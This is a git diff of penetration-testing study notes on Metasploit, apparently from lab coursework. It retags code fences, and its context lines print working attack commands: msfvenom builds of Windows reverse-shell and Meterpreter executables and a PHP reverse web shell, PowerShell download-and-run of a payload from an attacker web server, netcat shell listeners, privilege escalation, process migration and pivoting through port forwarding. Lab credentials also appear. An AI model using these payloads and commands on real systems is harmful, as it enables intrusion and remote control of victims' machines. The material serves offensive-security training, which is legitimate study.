@@ -109,7 +109,7 @@ Metasploit should never be a black box. Script it, log it, and justify every mod
 MSF comes preinstalled on Kali but doesn't start its DB service in the default configuration.  Use of the DB is not mandatory, but there are compelling reasons to like storing info about target hosts and tracking successful exploitation attempts.  MSF uses PostgresSQL as a DB service, which is not active or enable on boot in Kali.
 
 We can start, create, and initialize the MSF DB with `msfdb init`.
-```
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ sudo msfdb init                                          
 [sudo] password for operator: 
@@ -122,7 +122,7 @@ We can start, create, and initialize the MSF DB with `msfdb init`.
 ```
 
 To enable the DB service at boot time we use `systemctl`.
-```
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ sudo systemctl enable postgresql   
 Synchronizing state of postgresql.service with SysV service script with /lib/systemd/systemd-sysv-install.
@@ -131,7 +131,7 @@ Created symlink /etc/systemd/system/multi-user.target.wants/postgresql.service �
 ```
 
 Launch the Metasploit CLI with `msfconsole`.
-```
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ sudo msfconsole                 
                                                   
@@ -2061,7 +2061,7 @@ OS{fc62308419a67ed9611856e6a116c11d}
 Metasploit can also export payloads into various types of files, Win bins, Linux bins, and webshells for example.  Metasploit contains [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) as a standalone tool for generating these payloads.  It provides standardized command options and various techniques to customize payloads.
 
 To get familiar with msfvenom we'll create a mal Win bin that starts a raw TCP rev shell.  Let's start by listing all payloads with `-l` and arg `payloads`.  We will also pass `--platform` and `--arch`.
-```
+```bash
 kali@kali:~$ msfvenom -l payloads --platform windows --arch x64 
 
 ...
@@ -2074,7 +2074,7 @@ windows/x64/shell_reverse_tcp               Connect back to attacker and spawn a
  - We will use non-staged payload first.
 
 Now we use the `-p` flag to set the payload, set `LHOST`, and `LPORT` to assign host and port for the rev shell conn, `-f` to set the output format to `exe`, and `-o` to specify the output file name.
-```
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o nonstaged.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -2086,14 +2086,14 @@ Saved as: nonstaged.exe
 ```
 
 Now that we have created out mal bin, let's use it.  First we start a Netcat listener on port 443, Python3 web server on port 80, and connect to BRUTE2 via RDP with user `justin` and password `SuperS3cure1337#`.  Then start PowerShell to transfer the file and exec.
-```
+```powershell
 PS C:\Users\justin> iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
 
 PS C:\Users\justin> .\nonstaged.exe
 ```
 
 Once exec, we return to our Netcat listener.
-```
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ nc -nvlp 443 
 listening on [any] 443 ...
@@ -2105,7 +2105,7 @@ C:\Users\justin>
 ```
 
 Now we will use a staged payload to perform the same action.  We again use msfvenom to create the staged TCP reverse shell payload.
-```
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o staged.exe   
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -2117,7 +2117,7 @@ Saved as: staged.exe
 ```
 
 We received an incoming conn, but cannot exec any commands.  This is because Netcat does not know how to handle the staged payload.
-```
+```bash
 kali@kali:~$ nc -nvlp 443                                                                                
 listening on [any] 443 ...
 connect to [192.168.119.2] from (UNKNOWN) [192.168.50.202] 50832
@@ -2256,7 +2256,7 @@ msfvenom -l payloads
 ```
 
 Use msfvenom to create a PHP web shell (bind or reverse shell), rename the PHP file extension to .pHP (as we did in the Module "Common Web Application Attacks" in the section "Using Executable Files"), and upload it to VM #2 to obtain an interactive shell. The flag is located in C:\xampp\passwords.txt.
-```
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ msfvenom -p php/reverse_php LHOST=192.168.45.182 LPORT=443 --platform php -o webrevshell.php    
 [-] No arch selected, selecting arch: php from the payload
@@ -2453,7 +2453,7 @@ We used Meterpreter payloads to navigate the FS in the prior section, obtaining 
 Let's explor these features, note that the Linux Mterpreter payload contains less post-exploitation features than the Windows version.  Therefore we will explore these on Win target ITWK01.  Let's assume we already gained an initial foothold on the target system and deployed a bind shell to access the system.
 
 First, we'll create a Win bin with msfvenom containing a non-staged Meterpreter payload names `met.exe`
-```
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.182 LPORT=443 -f exe -o met.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -2507,7 +2507,7 @@ msf6 exploit(multi/handler) > run
 ```
 
 Next we start a Python3 web server, serve `met.exe`, conn to our bind shell, download our mal exe with PowerShell, and start the bin.
-```
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ nc $IT 4444 
 Microsoft Windows [Version 10.0.22000.1219]
@@ -2704,7 +2704,7 @@ In the previous section we migrated Meterpreter to a OneDrive.exe proc, preumabl
 We first connect to the bind shell on port 4444 of TKWK01, download `met.exe`, and enter `getsystem` to elev privs.  Then use `ps` to identify the proc ID of OneDrive.exe and `migrate` to it.
 
 Connect to bind shell and exev our binary.
-```
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ nc $IT 4444
 Microsoft Windows [Version 10.0.22000.1219]
@@ -2788,7 +2788,7 @@ Medium
 - We are operating in the context of integrity level Medium.
 
 Next we background the currently active channel and session to search for UAC post modules to leverage.
-```
+```powershell
 PS C:\Windows\system32> ^Z
 Background channel 1? [y/N]  y
 meterpreter > bg
@@ -3146,7 +3146,7 @@ Found entries:
 The ability to pivot from on target to another is vital.  In Port Redirection and Pivoting, we learned several techniques for pivoting.  Instead of perform these manually, we can also use Metasploit to perform them.
 
 As we did previously, we'll connect to a bind shell on port 4444 of machine ITWK01.  Assume we are currently gathering info on the target, we identify a second network interface.
-```
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ nc $IT 4444
 Microsoft Windows [Version 10.0.22000.1219]
@@ -3457,7 +3457,7 @@ meterpreter > portfwd add -l 4389 -p 3389 -r 172.16.128.200
 ```
 
 We can test by connecting to `127.0.0.1:4389` with `xfreerdp`.
-```
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ xfreerdp /v:127.0.0.1:4389 /u:luiza /timeout:20000
 ```
@@ -3500,7 +3500,7 @@ run -z -j
 ```
 
 Save the script and start Metasploit by passing the resource script as arg for `-r`.
-```
+```bash
 sudo msfconsole -r listener.rc
 ```
 
@@ -3547,7 +3547,7 @@ let's connect to BRUTE2 via RDP with user `justin` and password `SuperS3cure1337
 - Metasploit automatically migrated the session to the newly spawned process.
 
 Instead of creating our own resource scripts we can use the scripts provided by Metasploit found in `/usr/share/metasploit-framework/scripts/resource`.
-```
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ ls -l /usr/share/metasploit-framework/scripts/resource
 total 156
